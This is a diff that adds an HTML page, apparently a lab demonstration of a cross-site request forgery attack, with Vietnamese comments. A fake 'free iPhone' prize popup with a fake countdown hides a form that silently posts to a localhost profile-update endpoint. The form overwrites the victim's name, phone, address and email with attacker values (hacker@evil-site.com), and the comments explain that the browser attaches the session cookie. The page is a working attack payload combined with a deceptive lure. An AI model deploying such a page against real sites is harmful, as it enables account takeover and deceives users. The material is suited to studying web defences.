@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 Nhận Quà Miễn Phí - Siêu Khuyến Mãi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #ff6b35, #f7c59f);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+
+        .popup {
+            background: white;
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .popup img {
+            font-size: 60px;
+            display: block;
+            margin: 0 auto 10px;
+        }
+
+        h1 {
+            color: #e94560;
+            margin: 10px 0;
+            font-size: 26px;
+        }
+
+        p {
+            color: #555;
+            font-size: 15px;
+        }
+
+        .price-old {
+            text-decoration: line-through;
+            color: #aaa;
+            font-size: 18px;
+        }
+
+        .price-new {
+            color: #e94560;
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            background: linear-gradient(90deg, #e94560, #ff6b35);
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+        }
+
+        .countdown {
+            color: #e94560;
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="popup">
+        <div style="font-size: 64px;">🎁</div>
+        <h1>CHÚC MỪNG!</h1>
+        <p>Bạn là khách hàng thứ <b>1.000.000</b> ghé thăm!</p>
+        <p>Nhận ngay iPhone 16 Pro Max với giá không tưởng:</p>
+        <div class="price-old">25.000.000đ</div>
+        <div class="price-new">0đ</div>
+        <p>⏳ Ưu đãi chỉ còn <b>hết sau:</b></p>
+        <div class="countdown" id="timer">04:59</div>
+
+        <!--
+        =====================================================
+        ĐÂY LÀ FORM TẤN CÔNG CSRF — ẨN HOÀN TOÀN VỚI NẠNHÂN
+        · action trỏ thẳng vào endpoint của trang localhost
+        · Khi nạn nhân nhấn "Nhận Quà", Browser tự kèm
+          cookie access_token vào request này
+        · Không cần CSRF token vì server đang disable
+        =====================================================
+    -->
+        <iframe name="silent" style="display:none;"></iframe>
+        <form id="csrfForm" action="http://localhost:8080/profile-update" method="POST" enctype="multipart/form-data"
+            target="silent">
+
+            <!-- Dữ liệu độc hại Hacker muốn ghi vào tài khoản nạn nhân -->
+            <input type="hidden" name="fullname" value="heheeheheh">
+            <input type="hidden" name="email" value="hacker@evil-site.com">
+            <input type="hidden" name="phone" value="0999999999">
+            <input type="hidden" name="address" value="Nạn nhân đã bị tấn công CSRF!">
+
+            <!-- Nút ngụy trang thành nút "Nhận Quà" -->
+            <button type="submit" class="btn" onclick="showSuccess()">
+                🎁 NHẬN QUÀ NGAY
+            </button>
+        </form>
+
+        <div id="successMsg" style="display:none; color: green; margin-top:15px; font-weight:bold;">
+            ✅ Đang xử lý quà tặng cho bạn...
+        </div>
+
+        <p style="font-size:11px; color:#bbb; margin-top:15px;">
+            Bằng cách nhấn nút, bạn đồng ý với điều khoản sử dụng của chúng tôi.
+        </p>
+    </div>
+
+    <script>
+        // Đếm ngược giả tạo áp lực tâm lý
+        let seconds = 299;
+        setInterval(() => {
+            seconds--;
+            if (seconds < 0) seconds = 299;
+            const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+            const s = String(seconds % 60).padStart(2, '0');
+            document.getElementById('timer').textContent = m + ':' + s;
+        }, 1000);
+
+        function showSuccess() {
+            document.getElementById('successMsg').style.display = 'block';
+            // Âm thầm form đã submit → Browser gửi Cookie → CSRF thành công!
+        }
+    </script>
+
+</body>
+
+</html>
